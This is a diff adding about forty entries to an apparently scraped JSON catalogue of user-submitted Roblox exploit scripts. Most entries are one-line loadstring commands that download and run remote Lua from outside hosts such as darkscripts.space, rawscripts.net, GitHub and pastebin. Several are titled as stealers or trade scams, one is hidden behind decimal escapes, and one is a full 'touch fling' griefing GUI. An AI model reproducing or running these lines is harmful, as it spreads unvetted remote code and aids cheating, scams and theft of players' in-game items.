@@ -20871,6 +20871,310 @@
       "Script_Title": "Tycoon By:b0ssjkl066",
       "User_ID": 4321575771,
       "Username": "shewithepanda"
+    },
+    "Script2896": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b81744e4-ef7f-4093-9fcf-c6536c4b53ec_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2897": {
+      "Date": "December 16 2024",
+      "Description": "finally the CMDBAR3 HAS ARRIVED ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-projectCMDBAR-16747\"))()",
+      "Script_Title": "HD ADMIN Cmdbar3",
+      "User_ID": 1385009113,
+      "Username": "dyjose1"
+    },
+    "Script2898": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/b83af08b9de07d15191d1590.lua'))() loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ocfi/R6-Animations-Obfuscated/refs/heads/main/R6%20Animations\"))() loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-projectCMDBAR-16747\"))()",
+      "Script_Title": "Script bomb",
+      "User_ID": 1385009113,
+      "Username": "dyjose1"
+    },
+    "Script2899": {
+      "Date": "December 16 2024",
+      "Description": "Works Good",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b70b6bb4-c92a-4b55-a063-d67cd3ee2615_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "MM2 TRADE SCAM V1",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2900": {
+      "Date": "December 16 2024",
+      "Description": "works not on fixed blocks ",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()",
+      "Script_Title": "Telekinesis ",
+      "User_ID": 5062002693,
+      "Username": "danill38386"
+    },
+    "Script2901": {
+      "Date": "December 16 2024",
+      "Description": "Universal Script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Goose-Hub-V4-13125\"))()",
+      "Script_Title": "Goose Hub V4",
+      "User_ID": 1453912673,
+      "Username": "pw1983"
+    },
+    "Script2902": {
+      "Date": "December 16 2024",
+      "Description": "Nothing, yes, nothing",
+      "Script": "require(18981669514)(\"YourNameHere\")",
+      "Script_Title": "nothing",
+      "User_ID": 1385009113,
+      "Username": "dyjose1"
+    },
+    "Script2903": {
+      "Date": "December 16 2024",
+      "Description": "??? ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty23.lua\"))()",
+      "Script_Title": "control npc",
+      "User_ID": 4455014145,
+      "Username": "Dasfully_rqq"
+    },
+    "Script2904": {
+      "Date": "December 16 2024",
+      "Description": "Op script For Pet Simulator OP",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/c90efee9-03eb-465e-87ba-b55d0853f514_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pet Simulator 99 OP",
+      "User_ID": 5285277741,
+      "Username": "ROROGOPNIK"
+    },
+    "Script2905": {
+      "Date": "December 16 2024",
+      "Description": "This Script Allows You To Fling People By Touching Them.",
+      "Script": "-- Touch fling gui\n\n-- Gui to Lua (VIP VERSION)\n-- Version: 6.9\n\n-- Instances:\n\nlocal ScreenGui = Instance.new(\"ScreenGui\")\nlocal Frame = Instance.new(\"Frame\")\nlocal Frame_2 = Instance.new(\"Frame\")\nlocal TextLabel = Instance.new(\"TextLabel\")\nlocal TextButton = Instance.new(\"TextButton\")\n\n--Properties:\n\nScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(\"PlayerGui\")\nScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\nScreenGui.ResetOnSpawn = false\nprint(\"sub to DuplexScripts\")\n\nFrame.Parent = ScreenGui\nFrame.BackgroundColor3 = Color3.fromRGB(34, 34, 34)\nFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)\nFrame.BorderSizePixel = 0\nFrame.Position = UDim2.new(0.388539821, 0, 0.427821517, 0)\nFrame.Size = UDim2.new(0, 158, 0, 110)\n\nFrame_2.Parent = Frame\nFrame_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)\nFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)\nFrame_2.BorderSizePixel = 0\nFrame_2.Size = UDim2.new(0, 158, 0, 25)\n\nTextLabel.Parent = Frame_2\nTextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel.BackgroundTransparency = 1.000\nTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)\nTextLabel.BorderSizePixel = 0\nTextLabel.Position = UDim2.new(0.112792775, 0, -0.0151660154, 0)\nTextLabel.Size = UDim2.new(0, 121, 0, 26)\nTextLabel.Font = Enum.Font.Sarpanch\nTextLabel.Text = \"Touch Fling\"\nTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel.TextSize = 25.000\n\nTextButton.Parent = Frame\nTextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nTextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)\nTextButton.BorderSizePixel = 0\nTextButton.Position = UDim2.new(0.113924049, 0, 0.418181807, 0)\nTextButton.Size = UDim2.new(0, 121, 0, 37)\nTextButton.Font = Enum.Font.SourceSansItalic\nTextButton.Text = \"OFF\"\nTextButton.TextColor3 = Color3.fromRGB(0, 0, 0)\nTextButton.TextSize = 20.000\n\n-- Scripts:\n\nlocal function IIMAWH_fake_script() -- TextButton.LocalScript \n\tlocal script = Instance.new('LocalScript', TextButton)\n\n\tlocal ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\n\tlocal RunService = game:GetService(\"RunService\")\n\tlocal Players = game:GetService(\"Players\")\n\t\n\tlocal toggleButton = script.Parent\n\tlocal hiddenfling = false\n\tlocal flingThread \n\tif not ReplicatedStorage:FindFirstChild(\"juisdfj0i32i0eidsuf0iok\") then\n\t\tlocal detection = Instance.new(\"Decal\")\n\t\tdetection.Name = \"juisdfj0i32i0eidsuf0iok\"\n\t\tdetection.Parent = ReplicatedStorage\n\tend\n\t\n\tlocal function fling()\n\t\tlocal lp = Players.LocalPlayer\n\t\tlocal c, hrp, vel, movel = nil, nil, nil, 0.1\n\t\n\t\twhile hiddenfling do\n\t\t\tRunService.Heartbeat:Wait()\n\t\t\tc = lp.Character\n\t\t\thrp = c and c:FindFirstChild(\"HumanoidRootPart\")\n\t\n\t\t\tif hrp then\n\t\t\t\tvel = hrp.Velocity\n\t\t\t\thrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)\n\t\t\t\tRunService.RenderStepped:Wait()\n\t\t\t\thrp.Velocity = vel\n\t\t\t\tRunService.Stepped:Wait()\n\t\t\t\thrp.Velocity = vel + Vector3.new(0, movel, 0)\n\t\t\t\tmovel = -movel\n\t\t\tend\n\t\tend\n\tend\n\t\n\ttoggleButton.MouseButton1Click:Connect(function()\n\t\thiddenfling = not hiddenfling\n\t\ttoggleButton.Text = hiddenfling and \"ON\" or \"OFF\"\n\t\n\t\tif hiddenfling then\n\t\t\tflingThread = coroutine.create(fling)\n\t\t\tcoroutine.resume(flingThread)\n\t\telse\n\t\t\thiddenfling = false\n\t\tend\n\tend)\n\t\nend\ncoroutine.wrap(IIMAWH_fake_script)()\nlocal function QCJQJL_fake_script() -- Frame.LocalScript \n\tlocal script = Instance.new('LocalScript', Frame)\n\n\tscript.Parent.Active = true\n\tscript.Parent.Draggable = true\nend\ncoroutine.wrap(QCJQJL_fake_script)()",
+      "Script_Title": "Touch Fling Script",
+      "User_ID": 7703855016,
+      "Username": "XxBoySUPrEME"
+    },
+    "Script2906": {
+      "Date": "December 16 2024",
+      "Description": "A",
+      "Script": "\r\nloadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()\r\n--pshade ultimate--\r\n            ",
+      "Script_Title": "A",
+      "User_ID": 2538211046,
+      "Username": "Pae0550"
+    },
+    "Script2907": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b0d07043-9408-435f-9ebc-e4c221768b87_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate OP",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2908": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/b0d07043-9408-435f-9ebc-e4c221768b87_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate New Booth",
+      "User_ID": 5474475295,
+      "Username": "Oskomaexe"
+    },
+    "Script2909": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 4078735862,
+      "Username": "yourfavonecarter"
+    },
+    "Script2910": {
+      "Date": "December 16 2024",
+      "Description": "It's time to draw in the chat! (:",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-FE-Chat-Draw-17643\"))()",
+      "Script_Title": "Fe chat draw (7×7)",
+      "User_ID": 7404261333,
+      "Username": "friguq"
+    },
+    "Script2911": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "game:GetService(\"Players\").LocalPlayer.PlayerGui.CharacterSelectGUI.LightSoul:FireServer()",
+      "Script_Title": "UBS LightSoul",
+      "User_ID": 5141493252,
+      "Username": "IGOTBANEDFORSAYINBEI"
+    },
+    "Script2912": {
+      "Date": "December 16 2024",
+      "Description": "Working",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/85850b45-64fc-495a-a3e6-0c959916f5bc_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Stealer2",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2913": {
+      "Date": "December 16 2024",
+      "Description": "First go to pls donate and execute this script and you get knife in MM2",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/85850b45-64fc-495a-a3e6-0c959916f5bc_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Hazem Knife FREE",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2914": {
+      "Date": "December 16 2024",
+      "Description": "Beta ",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/85850b45-64fc-495a-a3e6-0c959916f5bc_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Farm GUI",
+      "User_ID": 7706095925,
+      "Username": "Alkazard1"
+    },
+    "Script2915": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua\", true))()",
+      "Script_Title": "Speed hub Blox Fruit",
+      "User_ID": 380550504,
+      "Username": "Nam_skg"
+    },
+    "Script2916": {
+      "Date": "December 16 2024",
+      "Description": "ssass",
+      "Script": "--[[\r\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\r\n]]\r\nloadstring(game:HttpGet(\"https://pastebin.com/raw/qBbBjMLm\"))()",
+      "Script_Title": "hia",
+      "User_ID": 4007527040,
+      "Username": "matkoalac8"
+    },
+    "Script2917": {
+      "Date": "December 16 2024",
+      "Description": "yes",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/85850b45-64fc-495a-a3e6-0c959916f5bc_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls donate op",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2918": {
+      "Date": "December 16 2024",
+      "Description": "free",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/85850b45-64fc-495a-a3e6-0c959916f5bc_1174109127849549895.lua',true))()                              ",
+      "Script_Title": "Pls Donate Collab",
+      "User_ID": 1953207419,
+      "Username": "rorobob110"
+    },
+    "Script2919": {
+      "Date": "December 16 2024",
+      "Description": "cool script use it",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-A-Train-22155\"))()",
+      "Script_Title": "garou to A-Train tsb",
+      "User_ID": 7567439388,
+      "Username": "MrBeast2023_Official"
+    },
+    "Script2920": {
+      "Date": "December 16 2024",
+      "Description": "hello",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/BENPCORDIE\"))()",
+      "Script_Title": "be npc or die script",
+      "User_ID": 7333298636,
+      "Username": "pan_8829"
+    },
+    "Script2921": {
+      "Date": "December 16 2024",
+      "Description": "Laba",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(game:HttpGet(\"https://pastefy.app/JlYVGe0k/raw\"))()",
+      "Script_Title": "Muie",
+      "User_ID": 3264410012,
+      "Username": "robloxeter9"
+    },
+    "Script2922": {
+      "Date": "December 16 2024",
+      "Description": ":D",
+      "Script": "loadstring(game:HttpGet\"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua\")()",
+      "Script_Title": "blox fruit auto farm",
+      "User_ID": 7057595357,
+      "Username": "ThaoNghivxke09767"
+    },
+    "Script2923": {
+      "Date": "December 17 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-rochips-universal-18294\"))()",
+      "Script_Title": "نسخ سكنات?",
+      "User_ID": 5368908683,
+      "Username": "GRICOFF1"
+    },
+    "Script2924": {
+      "Date": "December 17 2024",
+      "Description": "blox fruits script",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script\"))()",
+      "Script_Title": "Raito hub",
+      "User_ID": 1950960960,
+      "Username": "kenzie241013"
+    },
+    "Script2925": {
+      "Date": "December 17 2024",
+      "Description": "creds:Iznahamzah (blox fruits script)",
+      "Script": "loadstring(game:HttpGet(\"https://api.luarmor.net/files/v3/loaders/516a5669fc39b4945cd0609a08264505.lua\"))()",
+      "Script_Title": "Ganteng hub",
+      "User_ID": 1950960960,
+      "Username": "kenzie241013"
+    },
+    "Script2926": {
+      "Date": "December 17 2024",
+      "Description": "",
+      "Script": "require (7192763922).load(\"Ariane54545\")",
+      "Script_Title": ".",
+      "User_ID": 7498065414,
+      "Username": "Ariane54545"
+    },
+    "Script2927": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE SCRIPT",
+      "User_ID": 1247813431,
+      "Username": "masonrobloxing"
+    },
+    "Script2928": {
+      "Date": "December 16 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 1247813431,
+      "Username": "masonrobloxing"
+    },
+    "Script2929": {
+      "Date": "December 17 2024",
+      "Description": "hello",
+      "Script": "require(12159842278).ADMIN(\"ваш ник\")",
+      "Script_Title": "admin",
+      "User_ID": 7703004464,
+      "Username": "fnfgf28011"
+    },
+    "Script2930": {
+      "Date": "December 17 2024",
+      "Description": "the script can do all u need",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Rochips-Universal-21865\"))()",
+      "Script_Title": "SCRIPT BROOCKHAVEN",
+      "User_ID": 5368665685,
+      "Username": "Ahmed_king102536"
+    },
+    "Script2931": {
+      "Date": "December 17 2024",
+      "Description": "",
+      "Script": "loadstring(\"\\105\\102\\32\\110\\111\\116\\32\\103\\97\\109\\101\\58\\71\\101\\116\\83\\101\\114\\118\\105\\99\\101\\40\\34\\82\\101\\112\\108\\105\\99\\97\\116\\101\\100\\83\\116\\111\\114\\97\\103\\101\\34\\41\\58\\70\\105\\110\\100\\70\\105\\114\\115\\116\\67\\104\\105\\108\\100\\40\\34\\48\\49\\95\\115\\101\\114\\118\\101\\114\\34\\41\\32\\116\\104\\101\\110\\32\\114\\101\\116\\117\\114\\110\\32\\103\\97\\109\\101\\58\\71\\101\\116\\83\\101\\114\\118\\105\\99\\101\\40\\34\\84\\101\\108\\101\\112\\111\\114\\116\\83\\101\\114\\118\\105\\99\\101\\34\\41\\58\\84\\101\\108\\101\\112\\111\\114\\116\\40\\49\\55\\53\\55\\52\\54\\49\\56\\57\\53\\57\\44\\32\\103\\97\\109\\101\\58\\71\\101\\116\\83\\101\\114\\118\\105\\99\\101\\40\\34\\80\\108\\97\\121\\101\\114\\115\\34\\41\\46\\76\\111\\99\\97\\108\\80\\108\\97\\121\\101\\114\\41\\32\\101\\110\\100\\10\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\34\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\116\\121\\114\\101\\108\\116\\114\\105\\106\\111\\47\\102\\105\\114\\101\\47\\109\\97\\105\\110\\47\\102\\105\\114\\101\\34\\41\\41\\40\\41\\10\")()",
+      "Script_Title": "idk",
+      "User_ID": 7699113884,
+      "Username": "robloxhub_26"
+    },
+    "Script2932": {
+      "Date": "December 17 2024",
+      "Description": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own ",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/TexRBLX/Roblox-stuff/refs/heads/main/rakoof/rakoofEnc.lua\"))()",
+      "Script_Title": "rakoof",
+      "User_ID": 7119380594,
+      "Username": "originalrbs"
+    },
+    "Script2933": {
+      "Date": "December 17 2024",
+      "Description": "It's for those curious people in need lol",
+      "Script": "game.Players.LocalPlayer:Kick(\"LOL YOU GOT TROLLED BY kickyourasis!\")",
+      "Script_Title": "+18 script",
+      "User_ID": 7700579167,
+      "Username": "kickyourasis"
     }
   }
 }
